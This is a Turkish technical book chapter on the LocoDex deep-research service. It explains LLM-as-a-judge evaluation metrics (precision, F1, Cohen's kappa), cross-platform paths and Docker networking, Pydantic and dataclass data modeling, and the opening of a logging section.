# LocoDex Deep Search -- Teknik Kitap Bolum 2
# LLM-as-a-Judge, Cross-Platform, Data Modeling, Logging, Security

**Yazar:** Codex Consultant Agent
**Tarih:** 2026-03-15
**Kaynak Kod Referansi:** `deep_research_service/` dizini

---

# KONU 1: LLM-as-a-Judge Degerlendirme Sistemi

## 1.1 Teorik Temel: Otomatik Degerlendirme Problemi

Bir arastirma sisteminin ciktisini degerlendirmek icin uc temel yaklasim vardir:

1. **Insan degerlendirmesi (Gold standard):** En guvenilir ama en yavas ve pahali.
2. **Rule-based degerlendirme:** Exact match, BLEU, ROUGE gibi metrikler. Hizli ama esnek degil.
3. **LLM-as-a-Judge:** Bir LLM'i hakem olarak kullanma. Insana en yakin esneklik, otomatize edilebilir.

LocoDex'te tercih edilen yontem 3 numaradir. Kaynak kod `evals.py` dosyasinda implemente edilmistir.

### Neden LLM-as-a-Judge?

Arastirma ciktilari uzun, yapilandirilmamis metinlerdir. "LeBron James" sorusunun cevabi "LeBron Raymone James Sr." olabilir, "LeBron" olabilir, "James, LeBron" olabilir. Exact match bu varyasyonlarin hicbirini yakalamazken, LLM bunlarin hepsini eslestirebilir.

Formal olarak, degerlendirme fonksiyonu f'yi soyle tanimlayabiliriz:

```
f: (q, a_agent, a_correct) -> {0, 1}
```

Burada:
- q = soru (question)
- a_agent = ajanin verdigi cevap
- a_correct = dogru cevap (ground truth)
- Cikti: 0 (yanlis) veya 1 (dogru)

Bu binary scoring'dir. LocoDex'te 0-1 arasi continuous scoring KULLANILMAMISTIR -- sadece kesin dogru/yanlis.

### Alternatifler ve Neden Secilmedi

| Yaklasim | Avantaj | Dezavantaj | LocoDex'te? |
|-----------|---------|------------|-------------|
| Exact Match | Deterministik | "LeBron" vs "LeBron James" FAIL | Hayir |
| BLEU Score | N-gram bazli, hizli | Anlam yakalamiyor | Hayir |
| ROUGE Score | Recall odakli | Precision zayif | Hayir |
| BERTScore | Semantik benzerlik | Model gerektirir, threshold secimi zor | Hayir |
| LLM-as-a-Judge | Esnek, anlam bazli | Non-deterministik, bias riski | EVET |
| Insan degerlendirme | Gold standard | Pahali, olceklenmez | Hayir |

## 1.2 Implementasyon Analizi

`evals.py` dosyasinin tam analizi:

```python
@tenacity.retry(stop=tenacity.stop_after_attempt(3),
                wait=tenacity.wait_exponential(multiplier=1, min=4, max=15))
def llm_as_a_judge_scoring(result: Result) -> bool:
```

### Retry Mekanizmasi

Fonksiyon `tenacity` kutuphanesi ile retry pattern uygulamaktadir:

- **stop_after_attempt(3):** Maksimum 3 deneme
- **wait_exponential(multiplier=1, min=4, max=15):** Exponential backoff

Bekleme suresi formulu:

```
t_n = min(max_wait, max(min_wait, multiplier * 2^n))
```

Somut degerlerle:

```
t_0 = min(15, max(4, 1 * 2^0)) = min(15, max(4, 1)) = min(15, 4) = 4 saniye
t_1 = min(15, max(4, 1 * 2^1)) = min(15, max(4, 2)) = min(15, 4) = 4 saniye
t_2 = min(15, max(4, 1 * 2^2)) = min(15, max(4, 4)) = min(15, 4) = 4 saniye
```

Dikkat: Bu konfigurasyonda min=4 oldugu icin ilk 3 deneme de 4 saniye bekler. Exponential etki ancak min=1 olsaydi gorulebilirdi. Bu bir TASARIM TERCIHI: agresif retry yerine sabit minimum bekleme.

Toplam en kotu durum suresi: 4 + 4 + T_llm * 3 saniye (T_llm = LLM cagri suresi).

### XML Tag Parsing

Cevap formati XML tag'leri icinde yapilandirilmistir:

```xml
<reasoning>
The agent answer is correct because I can read that ....
</reasoning>

<answer>
1
</answer>
```

Parsing islemi:

```python
return bool(int(answer.split("<answer>")[1].split("</answer>")[0].strip()))
```

Bu tek satirlik parsing su adimlari yapar:
1. `split("<answer>")` -- string'i `<answer>` tag'inden boler, 2. eleman cevabi icerir
2. `[1]` -- `<answer>` sonrasi metni alir
3. `split("</answer>")[0]` -- `</answer>` oncesini alir
4. `.strip()` -- bosluk temizler
5. `int(...)` -- "0" veya "1" stringini integer'a cevirir
6. `bool(...)` -- 0 -> False, 1 -> True

**Kirilganlik Analizi:** Bu parser su durumlarda BOZULUR:
- LLM `<answer>` tag'i uretmezse -> `IndexError` (retry ile yakalanir)
- LLM "Yes" / "No" yazarsa `<answer>` yerine -> `IndexError`
- LLM "0.5" gibi float yazarsa -> `ValueError` (int() cast basarisiz)
- LLM bos `<answer></answer>` donererse -> `ValueError` (int("") basarisiz)

Tum bu hatalar tenacity retry ile yakalanir ve tekrar denenir.

### Flexible Matching

Prompt'taki su cumle flexible matching'i saglar:

> "For example, answering with names instead of name and surname is fine."

Bu, LLM'e explicit olarak "LeBron" = "LeBron James" esitligini kabul etmesini soyler. Rule-based bir sistemde bunu yapmak icin fuzzy string matching (Levenshtein distance, Jaccard similarity) gerekir:

**Levenshtein Distance:**
```
d("LeBron", "LeBron James") = 6 (6 karakter ekleme)
```

Normalize edilmis hali:
```
d_norm = 6 / max(6, 12) = 6/12 = 0.5
similarity = 1 - 0.5 = 0.5
```

Threshold 0.7 olsaydi bu FAIL ederdi. Ama LLM semantik olarak bunlarin ayni kisiye referans verdigini anlar. Bu, LLM-as-a-Judge'in en buyuk avantajidir.

## 1.3 Evaluation Metrikleri: Matematiksel Turetme

Bir evaluation pipeline'in kendisini degerlendirmek icin klasik classification metrikleri kullanilir:

### Confusion Matrix

Diyelim ki 100 arastirma sorusu var. LLM-as-a-Judge her birini "dogru" (1) veya "yanlis" (0) olarak degerlendirir. Insan evaluator'u da ayni soruları degerlendirmistir (ground truth).

```
                   LLM Judge Tahmini
                   Dogru (1)    Yanlis (0)
Gercek   Dogru(1)    TP=72        FN=8
Durum    Yanlis(0)    FP=5         TN=15
```

Burada:
- **TP (True Positive) = 72:** LLM dogru dedi, gercekten dogru
- **TN (True Negative) = 15:** LLM yanlis dedi, gercekten yanlis
- **FP (False Positive) = 5:** LLM dogru dedi ama aslinda yanlis (Type I Error)
- **FN (False Negative) = 8:** LLM yanlis dedi ama aslinda dogru (Type II Error)

### Accuracy (Dogruluk)

**Tanim:** Tum tahminler icinde dogru yapilanlarin orani.

```
Accuracy = (TP + TN) / (TP + TN + FP + FN)
         = (72 + 15) / (72 + 15 + 5 + 8)
         = 87 / 100
         = 0.87 = %87
```

**Sinirlamasi:** Dengesiz veri setlerinde yanilticidir. Eger 95 soru dogru, 5 yanlis ise, "hep dogru de" stratejisi %95 accuracy verir ama hicbir yanlisi yakalamazsiniz.

### Precision (Kesinlik)

**Tanim:** "Dogru" dediklerimin kaci gercekten dogru?

```
Precision = TP / (TP + FP)
          = 72 / (72 + 5)
          = 72 / 77
          = 0.935 = %93.5
```

**Yorum:** LLM "bu cevap dogru" dediginde %93.5 olasilikla hakliydi. %6.5 false positive orani.

### Recall (Duyarlilik)

**Tanim:** Gercekten dogru olanlarin kacini yakaladim?

```
Recall = TP / (TP + FN)
       = 72 / (72 + 8)
       = 72 / 80
       = 0.90 = %90
```

**Yorum:** 80 dogru cevaptan 72'sini dogru olarak tanimladi, 8'ini kacirdi.

### F1 Score

**Tanim:** Precision ve Recall'un harmonik ortalamasi. Neden harmonik ortalama?

Aritmetik ortalama: (P + R) / 2 = (0.935 + 0.90) / 2 = 0.9175

Harmonik ortalama: 2PR / (P + R) = 2 * 0.935 * 0.90 / (0.935 + 0.90)

Adim adim:
```
Pay   = 2 * 0.935 * 0.90 = 1.683
Payda = 0.935 + 0.90 = 1.835
F1    = 1.683 / 1.835 = 0.9172
```

Harmonik ortalama her zaman aritmetik ortalamadan kucuk veya esittir: HM <= AM. Bu ozellik, F1'i daha "cezalandirici" yapar -- Precision veya Recall'dan biri dusukse F1 daha agir etkilenir.

**Neden harmonik ortalama?**

Diyelim Precision = 1.0 (hep dogru dedigim dogru), Recall = 0.01 (sadece 1 tanesini dogru dedim).
- Aritmetik: (1.0 + 0.01) / 2 = 0.505 (cok iyi gorunuyor, YANILTICI)
- Harmonik: 2 * 1.0 * 0.01 / (1.0 + 0.01) = 0.02 / 1.01 = 0.0198 (gercegi yansitiyor)

## 1.4 Cohen's Kappa: Inter-Rater Agreement

Cohen's Kappa, iki degerlendirici arasindaki uyumun sansa bagli uyumdan ne kadar iyi oldugunu olcer.

### Formul Turetmesi

Iki degerlendirici olsun: LLM Judge ve Insan Evaluator. N = 100 ornek:

```
                   Insan: Dogru    Insan: Yanlis    Toplam
LLM: Dogru            77              5              82
LLM: Yanlis            8             10              18
Toplam                85             15             100
```

**Adim 1: Gozlenen uyum (p_o)**

```
p_o = (ayni karar verdikleri sayisi) / (toplam)
    = (77 + 10) / 100
    = 87 / 100
    = 0.87
```

**Adim 2: Sansa bagli beklenen uyum (p_e)**

Her iki degerlendirici birbirinden bagimsiz rastgele karar verseydi ne kadar uyum beklerdik?

LLM'in "dogru" deme olasiligi: P(LLM=dogru) = 82/100 = 0.82
Insan'in "dogru" deme olasiligi: P(Insan=dogru) = 85/100 = 0.85

Ikisinin de sansa bagli "dogru" demesi: 0.82 * 0.85 = 0.697
Ikisinin de sansa bagli "yanlis" demesi: 0.18 * 0.15 = 0.027

```
p_e = P(ikisi de dogru) + P(ikisi de yanlis)
    = 0.697 + 0.027
    = 0.724
```

**Adim 3: Kappa hesaplama**

```
kappa = (p_o - p_e) / (1 - p_e)
      = (0.87 - 0.724) / (1 - 0.724)
      = 0.146 / 0.276
      = 0.529
```

### Kappa Deger Yorumlamasi

| kappa Araligi | Yorum |
|--------------|-------|
| < 0 | Sanstan kotu (sistematik uyumsuzluk) |
| 0.00 - 0.20 | Zayif uyum |
| 0.21 - 0.40 | Orta uyum |
| 0.41 - 0.60 | Makul uyum |
| 0.61 - 0.80 | Onemli uyum |
| 0.81 - 1.00 | Neredeyse mukemmel uyum |

kappa = 0.529 -> "Makul uyum". Arastirma amacli kabul edilebilir ama production-grade degil.

### Kappa'nin Sinirlamalari

1. **Prevalence paradox:** Eger cogu ornek bir sinifta (ornegin %95 dogru) ise, p_e cok yuksek olur ve kappa dusuk cikar -- iki degerlendirici neredeyse ayni fikirde olsa bile.

2. **Bias paradox:** Eger bir degerlendirici diger degerlendirciden sistematik olarak daha "comer" ise, kappa bu durumu yakalayamaz.

Sayisal ornek (prevalence paradox):
```
p_o = 0.95, LLM dogru orani = 0.96, Insan dogru orani = 0.94
p_e = 0.96 * 0.94 + 0.04 * 0.06 = 0.9024 + 0.0024 = 0.9048
kappa = (0.95 - 0.9048) / (1 - 0.9048) = 0.0452 / 0.0952 = 0.475
```

%95 uyum var ama kappa sadece 0.475! Bu, "cogunluk sinifi cok buyuk" oldugunda kappa'nin cezalandirici oldugunu gosterir.

## 1.5 LLM Bias Sorunlari

### Position Bias

LLM'ler genellikle prompt'un BASINDA veya SONUNDA verilen bilgilere daha fazla agirlik verir. Evaluation bağlaminda:

Eger agent_answer prompt'ta correct_answer'dan ONCE verilirse, LLM agent_answer'a daha fazla "dikkat" (attention score) verir. LocoDex'teki prompt siralama:

```
1. question
2. agent_answer
3. correct_answer
```

Bu, agent_answer'a kismen position advantage saglar. Ideal test: siralama reverse edilip sonuclarin tutarliligina bakilmalidir.

**Matematiksel model:**
```
P(correct | agent_first) != P(correct | correct_first)
```

Eger bu iki olasilik arasinda istatistiksel anlamli fark varsa (p-value < 0.05), position bias mevcuttur.

### Verbosity Bias

LLM'ler uzun, detayli cevaplara daha yuksek skor verme egilimindedir. LocoDex prompt'undaki su satir bunu azaltmaya calisir:

> "Note that the agent answer might be a long text containing a lot of information or it might be a short answer."

Ama bu explicit uyari bile bias'i tamamen ortadan kaldirmaz. Deneysel olarak:

```
P(score=1 | len(answer) > 500) > P(score=1 | len(answer) < 100)
```

Bu esitsizlik cogu LLM icin gecerlidir.

### Self-Enhancement Bias

Ayni model ailesi hem cevap uretiyorsa hem degerlendiriyorsa, kendi ciktilarina daha yuksek skor verme egilimi gosterir. LocoDex'te:

- Cevap ureten: DeepSeek-R1-Distill-Llama-70B (answer_model)
- Degerlendiren: Llama-3.3-70B-Instruct-Turbo (evals.py)

Bunlar FARKLI modeller. Bu iyi bir tasarim -- self-enhancement bias azaltilmis. Ancak ikisi de Llama ailesine dayanmaktadir (shared pretraining), bu da bir miktar family bias riski tasir.

## 1.6 Meta-Evaluation

Meta-evaluation, degerlendirme sisteminin kendisini degerlendirmektir. Soyle bir dongu olusur:

```
Agent ciktisi -> LLM Judge degerlendirmesi -> Meta-evaluation (Judge'in performansi)
```

Meta-evaluation icin:
1. Kucuk bir "gold set" olusturulur (insan evaluator'ler tarafindan degerlendirilmis ornekler)
2. LLM Judge ayni ornekleri degerlendirir
3. Judge'in sonuclari gold set ile karsilastirilir
4. Confusion matrix, Kappa, Accuracy hesaplanir

LocoDex'te explicit meta-evaluation pipeline'i yoktur. Bu, production'a giderken eklenmesi gereken bir eksikliktir.

## 1.7 O(n) Analizi

| Islem | Karmasiklik | Aciklama |
|-------|-------------|----------|
| Tek bir ornegi degerlendirme | O(L) | L = prompt + cevap token sayisi |
| N ornegi degerlendirme | O(N * L) | Her ornek icin bir LLM call |
| XML tag parsing | O(K) | K = cevap string uzunlugu |
| Retry ile worst case | O(3 * N * L) | 3 deneme * N ornek |
| Cohen's Kappa hesaplama | O(N) | N ornek uzerinde tek gecis |

Tipik degerler: L ~ 2000 token, N ~ 100 ornek icin toplam ~200K token islem gerekir.

---

# KONU 2: Cross-Platform Dagitim Mimarisi

## 2.1 Teorik Temel: Platform Abstraction

Yazilimin farkli isletim sistemlerinde calisabilmesi icin platform-specific farkliliklarin soyutlanmasi gerekir. Bu, **Strategy Pattern** ile cozulur.

### Strategy Pattern

GoF (Gang of Four) tasarim desenlerinden biri. Bir davranisi encapsulate edip runtime'da degistirilebilir yapar.

```
[Client] --uses--> [Strategy Interface]
                        |
          +-------------+-------------+
          |             |             |
   [WindowsStrategy] [macOSStrategy] [LinuxStrategy]
```

LocoDex'te `path_utils.py` dosyasindaki `PlatformPaths` sinifi bu pattern'i uygular:

```python
class PlatformPaths:
    @staticmethod
    def get_platform() -> str:
        return platform.system().lower()

    @staticmethod
    def get_base_data_dir() -> Path:
        if PlatformPaths.is_docker():
            return Path('/app')
        system = PlatformPaths.get_platform()
        if system == 'windows':
            return Path(appdata) / 'LocoDex'
        elif system == 'darwin':
            return Path.home() / 'Library' / 'Application Support' / 'LocoDex'
        else:
            return Path(xdg_data_home) / 'locodex'
```

Bu, `if/elif/else` zincirine dayali basitlestirilmis bir Strategy implementasyonudur. Tam bir Strategy Pattern'de her platform icin ayri bir sinif olur, ama static metodlarla lightweight cozum yeterlidir.

### Platform-Specific Path Karsilastirmasi

| Amaç | macOS | Windows | Linux | Docker |
|------|-------|---------|-------|--------|
| Data | ~/Library/Application Support/LocoDex | %APPDATA%/LocoDex | ~/.local/share/locodex | /app |
| Cache | ~/Library/Caches/LocoDex | %LOCALAPPDATA%/LocoDex/cache | ~/.cache/locodex | /app/cache |
| Desktop | ~/Desktop | %USERPROFILE%/Desktop | ~/Desktop | /app/desktop |
| Temp | /tmp/locodex | %TEMP%/LocoDex | /tmp/locodex | /tmp/locodex |
| Logs | ~/Library/Application Support/LocoDex/logs | %APPDATA%/LocoDex/logs | ~/.local/share/locodex/logs | /app/logs |

### Neden Bu Yollar?

**macOS:** Apple'in Human Interface Guidelines'i uygulamalarin `~/Library/Application Support/` altinda veri tutmasini oner. Kullanici bunlari Finder'da gormez (gizli dizin).

**Windows:** `%APPDATA%` (Roaming) vs `%LOCALAPPDATA%` (Local) ayrimina dikkat edilmeli. Roaming dizin domain ortamlarinda bilgisayarlar arasi sync edilir. LocoDex Roaming kullanir -- bu dogru cunku kullanici ayarlari tasimak mantikli.

**Linux:** XDG Base Directory Specification (freedesktop.org). `XDG_DATA_HOME` environment variable'i tanimli degilse `~/.local/share/` varsayilir.

### Docker Environment Detection

```python
@staticmethod
def is_docker() -> bool:
    return os.path.exists('/.dockerenv') or os.path.exists('/proc/1/cgroup')
```

Iki kontrol yapilir:
1. `/.dockerenv`: Docker runtime'in olusturdugu sentinel file
2. `/proc/1/cgroup`: PID 1'in cgroup bilgisi -- Docker container'da "docker" veya "containerd" iceren satirlar bulunur

Eger ikisi de yoksa -> host makinede calisiyoruz demektir.

## 2.2 Docker Containerization

### Base Image Secimi: python:3.11-slim

```dockerfile
FROM python:3.11-slim
```

**Boyut karsilastirmasi:**

| Image | Boyut | Icerik |
|-------|-------|--------|
| python:3.11 | ~920 MB | Debian full + build tools |
| python:3.11-slim | ~150 MB | Debian minimal |
| python:3.11-alpine | ~50 MB | Alpine Linux minimal |

**Neden slim?**
- `full` gereksiz buyuk (gcc, make, dev headers -- LocoDex bunlari kullanmaz)
- `alpine` musl libc kullanir, bazi Python paketleri (numpy, pandas, beautifulsoup4) glibc gerektirdigi icin uyumsuzluk riski tasir
- `slim` glibc tabanli ve minimal -- en iyi denge

### Layer Caching Pattern

```dockerfile
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
```

Bu siralama KRITIK'tir. Docker her katmani cache'ler. Eger `COPY . .` once gelseydi:

```
# YANLIS SIRALAMA (her kod degisikliginde tum pip install tekrar calisir):
COPY . .
RUN pip install --no-cache-dir -r requirements.txt
```

Dogru siralamada:
1. `requirements.txt` degismediginde pip install katmani CACHE'ten gelir (~30 saniye -> 0 saniye)
2. Sadece `COPY . .` katmani yeniden calisir (~1 saniye)

**Matematiksel etki:**

Diyelim:
- pip install suresi: T_pip = 45 saniye
- Kod kopyalama suresi: T_copy = 2 saniye
- Toplam build sayisi (gunluk): N = 20

Cache ILE:   N * T_copy = 20 * 2 = 40 saniye/gun (requirements degismezse)
Cache OLMADAN: N * (T_pip + T_copy) = 20 * 47 = 940 saniye/gun = ~16 dakika/gun

Gunluk 15 dakika tasarruf. Yilda: 15 * 365 / 60 = 91 saat.

### PYTHONUNBUFFERED=1

```dockerfile
ENV PYTHONUNBUFFERED=1
```

Python'un stdout/stderr buffer'ini kapatir. Neden?

Normal davranista Python stdout'u **line-buffered** (terminal'e yazarken) veya **block-buffered** (pipe/dosya'ya yazarken) yapar. Docker container'da stdout bir pipe uzerinden Docker daemon'a gider -- yani block-buffered olur.

Block buffer boyutu tipik olarak 4096 byte veya 8192 byte'tir. Yani bir `print("Arastirma basladi")` mesaji hemen gorunmez, buffer dolana kadar bekler.

`PYTHONUNBUFFERED=1` ile her write() cagrisinda veri hemen flush edilir. Bu, `docker logs` ile gercek zamanli log takibini mumkun kilar.

**Performans maliyeti:** Her write'da flush yapmak disk I/O'sunu arttirir. Ama loglama frekansi dusuk oldugu icin (saniyede birkaç write) bu maliyet ihmal edilebilir. Yuksek frekanslı veri yaziminda (ornegin saniyede 10000 satir) buffer'li mod %30-50 daha hizli olurdu.

### Port Mapping

```dockerfile
EXPOSE 8001
```

Container icindeki FastAPI uygulamasi 8001 portunu dinler. `docker run -p 8001:8001 ...` ile host'un 8001 portuna map edilir.

Port secimi: 8001, standart HTTP (80/443) veya yaygin servis portlari (3000, 5000, 8000, 8080) ile catismasindan kacinmak icindir. 8000 yerine 8001 tercih edilmis cunku 8000 sik kullanilir (Django default).

## 2.3 Docker-to-Host Networking

LocoDex'in en karmasik mimarisi burada: Docker container icinden host makinedeki LLM servisine (Ollama/LM Studio) erismek.

### Fallback Chain

`smart_multilingual_research.py` L38-49:

```python
try:
    host_ip = socket.gethostbyname('host.docker.internal')
except:
    try:
        host_ip = "192.168.65.1"  # Docker Desktop default gateway
    except:
        try:
            host_ip = "172.17.0.1"  # Docker bridge network
        except:
            host_ip = "localhost"
```

**Adim 1: host.docker.internal**

Docker Desktop (macOS/Windows) tarafindan saglanan ozel DNS adi. Container icinden host makineyi gosterir. Docker Engine (Linux) bu DNS'i varsayilan olarak desteklemez -- `--add-host=host.docker.internal:host-gateway` flag'i gerekir.

DNS cozumleme: Container'daki `/etc/resolv.conf` Docker'in internal DNS server'ini (127.0.0.11) isaret eder. Bu DNS, `host.docker.internal`'i host makine IP'sine cozumler.

**Adim 2: 192.168.65.1**

Docker Desktop for macOS, HyperKit (veya Apple Hypervisor) sanal makinesi icinde calisir. Sanal makinenin gateway IP'si genellikle 192.168.65.1'dir. Bu IP, sanal makineden host'a erisim saglar.

**Adim 3: 172.17.0.1**

Docker bridge network'un default gateway'i. `docker0` sanal arayuzunun IP adresi. Linux'ta container bu IP uzerinden host'a erisebilir. macOS/Windows'ta ise Docker sanal makine icinde calistigi icin bu IP genellikle calismaz.

**Adim 4: localhost (Fallback)**

Container icinde localhost = container kendisi (127.0.0.1). Host makineyi DEGiL container'in kendi network namespace'ini gosterir. Bu sadece host networking modunda (`--network=host`) calisir. LocoDex'te bu son care.

### Network Topology

```
+------------------+    +-------------------+    +----------------+
| Docker Container |    | Docker Network    |    | Host Machine   |
| (LocoDex)        |    | (Bridge)          |    |                |
|                  |    |                   |    | Ollama :11434  |
| App :8001 -------+--->| 172.17.0.1 ------+--->| LM Studio :1234|
|                  |    | (docker0 gateway) |    |                |
+------------------+    +-------------------+    +----------------+
        |                                              ^
        +--- host.docker.internal DNS ----------------+
```

## 2.4 O(n) Analizi

| Islem | Karmasiklik |
|-------|-------------|
| Platform detection | O(1) -- tek system call |
| Path resolution | O(P) -- P = path derinligi |
| Docker detection | O(1) -- dosya varlik kontrolu |
| DNS resolution (host.docker.internal) | O(1) amortize -- DNS cache |
| Fallback chain (worst case) | O(4) -- 4 deneme |
| Docker build (cached) | O(F) -- F = degisen dosya sayisi |
| Docker build (uncached) | O(D) -- D = dependency sayisi |

## 2.5 Sinirlamalar

1. **Docker bridge networking macOS'ta yavas:** macOS'ta Docker sanal makine uzerinden calisir, network paketleri host-vm arasinda ekstra hop yapar. Latency ~0.5-2ms eklenir (native'e gore).

2. **Port cakismasi:** 8001 baska bir servis tarafindan kullaniliyorsa LocoDex baslatilmaz. Cozum: environment variable ile konfigurasyon.

3. **DNS resolution zamani:** Ilk `host.docker.internal` cozumlemesi ~10-50ms surebilir. Sonraki cagrilar cache'ten gelir.

4. **Slim image'da eksik paketler:** Bazi Python paketleri derleme gerektiriyorsa (Cython, numpy native) slim image'da `gcc` bulunmaz. LocoDex'in dependency'leri pure Python oldugu icin bu sorun yoktur.

---

# KONU 3: Veri Modelleme ve Tip Guvenligi

## 3.1 Teorik Temel: Runtime Type Validation

Python dynamically typed bir dildir -- runtime'da tip kontrolu yapmaz. Bu esneklik saglarken bug'larin production'da patlamasina da yol acar.

```python
# Python buna izin verir:
def search(query: str) -> dict:
    return 42  # tip hatasi -- runtime'da HATA YOK, sadece type checker uyarir
```

**Pydantic v2** bu sorunu cozer: runtime'da veri dogrulama yapar.

### Pydantic v2 Arsitekture

Pydantic v2, Rust tabanli `pydantic-core` uzerine kurulmustur. v1'e gore ~5-50x hizli:

```
Python katmani (pydantic) -> Rust katmani (pydantic-core) -> Deger validasyonu
```

LocoDex'te Pydantic kullanan siniflar:

```python
# data_types.py
class ResearchPlan(BaseModel):
    queries: list[str] = Field(
        description="A list of search queries to thoroughly research the topic")

class SourceList(BaseModel):
    sources: list[int] = Field(
        description="A list of source numbers from the search results")
```

```python
# server.py
class ResearchRequest(BaseModel):
    topic: str
    model: str | None = None
```

### BaseModel vs dataclass Karsilastirmasi

| Ozellik | Pydantic BaseModel | Python dataclass | frozen dataclass |
|---------|-------------------|------------------|------------------|
| Runtime validation | EVET | HAYIR | HAYIR |
| Type coercion | EVET ("42" -> 42) | HAYIR | HAYIR |
| JSON serialization | model_json_schema() | Manuel | Manuel |
| Immutability | model_config = frozen | Hayir | EVET |
| Hashable | Hayir (varsayilan) | Hayir | EVET |
| Performans (olusturma) | ~1-5 us | ~0.3 us | ~0.3 us |
| Bellek | Daha fazla (metadata) | Az | Az |

**Somut benchmark (tahmini):**
```
1M ResearchPlan olusturma:
  Pydantic BaseModel: ~5 saniye (5 us/ornek)
  dataclass: ~0.3 saniye (0.3 us/ornek)
  Fark: ~17x
```

LocoDex'te bu fark onemli DEGiLDiR cunku veri nesneleri saniyede en fazla 100-1000 kere olusturulur. Darbogazasp LLM call'dur (saniyeler mertebesinde).

### Field Metadata

```python
queries: list[str] = Field(
    description="A list of search queries to thoroughly research the topic")
```

`description` parametresi IKI amaca hizmet eder:
1. **Dokumantasyon:** Gelistiriciye alanin ne oldugunu soyler
2. **JSON Schema:** `model_json_schema()` cagrildiginda schema'ya dahil edilir. LLM'e structured output talep ederken bu schema gonderilir:

```python
response_format={"type": "json_object", "schema": ResearchPlan.model_json_schema()}
```

Bu, LLM'in ciktisini Pydantic schema'ya gore yapilandirmasini saglar.

## 3.2 Frozen Dataclass Pattern

`data_types.py` ve `tavily_search.py`:

```python
@dataclass(frozen=True, kw_only=True)
class SearchResult:
    title: str
    link: str
    content: str
    raw_content: Optional[str] = None
```

### frozen=True

Tum alanlari read-only yapar. Atama girisimi `FrozenInstanceError` firlatir:

```python
result = SearchResult(title="Test", link="http://...", content="...")
result.title = "Degistir"  # FrozenInstanceError!
```

**Neden?** Arastirma sonuclari olusturulduktan sonra degismemalidir -- referential integrity icin. Eger bir sonuc baska yerlerde referans ediliyorken icerik degisirse, tutarsizlik olusur.

Frozen dataclass'lar **hashable** olur:

```python
result_set = {result1, result2, result3}  # set icinde kullanilabilir
result_dict = {result1: "analiz_sonucu"}  # dict key olabilir
```

Hash hesaplamasi:

```python
hash(result) = hash((result.title, result.link, result.content, result.raw_content))
```

Python tuple'larin hash'ini element hash'lerinin XOR kombinasyonu ile hesaplar:

```
h = hash(field_1)
for field in fields[1:]:
    h = h ^ hash(field) * prime_multiplier
```

### kw_only=True

Tum alanlar keyword-only olmak zorundadir:

```python
# GECERLI:
SearchResult(title="T", link="L", content="C")

# GECERSIZ:
SearchResult("T", "L", "C")  # TypeError: positional arguments not allowed
```

Bu, field siralamasina bagli bug'lari onler. `title` ve `link` yer degistirse bile keyword argumanlari dogru alana gider.

## 3.3 Veri Akisi Hiyerarsisi

```
SearchResult (tavily_search.py)
    |
    v  [Kalitim]
DeepResearchResult (data_types.py)
    |
    v  [Composition]
DeepResearchResults (data_types.py) -- results: list[DeepResearchResult]
```

### SearchResult -> DeepResearchResult (Inheritance)

```python
@dataclass(frozen=True, kw_only=True)
class DeepResearchResult(SearchResult):
    filtered_raw_content: str
```

DeepResearchResult, SearchResult'in TUM alanlarini kalitir (title, link, content, raw_content) ve bir alan ekler: `filtered_raw_content`.

**Neden inheritance?** Liskov Substitution Principle (LSP): DeepResearchResult her yerde SearchResult yerine kullanilabilir. Tavily arama sonuclari ile Google arama sonuclari ayni arayuz uzerinden islenebilir.

### DeepResearchResults (Composition)

```python
@dataclass(frozen=True, kw_only=True)
class DeepResearchResults(SearchResults):
    results: list[DeepResearchResult]
```

Bu sinif `results` listesini ICERIR (composition). Ek operasyonlar:

1. **Toplama (Concatenation):**
```python
def __add__(self, other):
    return DeepResearchResults(results=self.results + other.results)
```

Iki arama sonuc kumesini birlestirmek icin `+` operatoru kullanilabilir. O(n + m) karmasiklik.

2. **Deduplication:**
```python
def dedup(self):
    seen_links = set()
    unique_results = []
    for result in results:
        if result.link not in seen_links:
            seen_links.add(result.link)
            unique_results.append(result)
    return DeepResearchResults(results=unique_results)
```

Link-based dedup: ayni URL'ye sahip sonuclari eler. `set` lookup O(1) amortize oldugu icin toplam O(n).

**Sinirlamasi:** Icerik-based dedup yoktur. Farkli URL'ler ayni icerigi gosterebilir (mirror site'lar, AMP versiyonlari). SimHash veya MinHash ile content dedup eklenebilir.

## 3.4 Composition vs Inheritance

LocoDex hem composition hem inheritance kullanir:

**Inheritance kullanilan yer:** SearchResult -> DeepResearchResult
**Sebep:** "IS-A" iliskisi. DeepResearchResult BIR SearchResult'tur.

**Composition kullanilan yer:** DeepResearchResults icinde results listesi
**Sebep:** "HAS-A" iliskisi. Results collection BIR liste ICERIR.

Genel kural: "Prefer composition over inheritance" (GoF). Ancak is-a iliskisi aciksa inheritance dogru tercihdir. LocoDex'te bu denge iyi kurulmus.

## 3.5 Type Hints

LocoDex codebase'inde kullanilan tip anotasyonlari:

```python
Union: str | None = None          # Python 3.10+ syntax (server.py L287)
Optional: Optional[str] = None    # Eski syntax (tavily_search.py L29)
list[str]                         # Generic list (data_types.py L12)
list[int]                         # Generic list (data_types.py L17)
dict[str, str | dict[str, Any]]   # Nested generic (llms.py L42)
Callable                          # Function type (evals.py L15)
```

`Union[str, None]` ve `Optional[str]` ve `str | None` uc ayni seyi ifade eder. LocoDex'te iki farkli syntax kullanilmasi tutarsizdir ama islev olarak sorun yaratmaz.

## 3.6 O(n) Analizi

| Islem | Karmasiklik | Aciklama |
|-------|-------------|----------|
| Pydantic model olusturma | O(F) | F = field sayisi (validation) |
| Dataclass olusturma | O(1) | Field sayisindan bagimsiz |
| JSON schema uretimi | O(F) | Her field icin schema node |
| Dedup (link-based) | O(N) | N = sonuc sayisi, set lookup O(1) |
| __add__ (birlestirme) | O(N + M) | Iki liste birlestirilir |
| hash() hesaplama | O(F) | Her field hash'lenir |

---

# KONU 4: Logging ve Observability

## 4.1 Teorik Temel: Structured Logging

Logging, bir uygulamanin runtime davranisini kayit altina alma islemidir. "Observability" ise uc bilesenli bir kavramdir:

1. **Logs:** Ayrik olaylar (text-based)
2. **Metrics:** Sayisal olcumler (counter, gauge, histogram)
3. **Traces:** Dagitik islem zincirleri

LocoDex'te sadece Logs ve sinirli Traces (WebSocket progress) implemente edilmistir. Metrics eksiktir.

## 4.2 AgentLogger Sinifi

`log.py` dosyasindaki AgentLogger Python'un `logging` modulunu sarmalar.

### Log Level Hiyerarsisi

Python'un logging modulu su seviyeleri tanimlar:

```
NOTSET   =  0  (tum mesajlar gecer)
DEBUG    = 10  (gelistirme detaylari)
INFO     = 20  (normal islem bilgileri)
WARNING  = 30  (potansiyel sorunlar)
ERROR    = 40  (hatalar)
CRITICAL = 50  (ciddi hatalar)
```

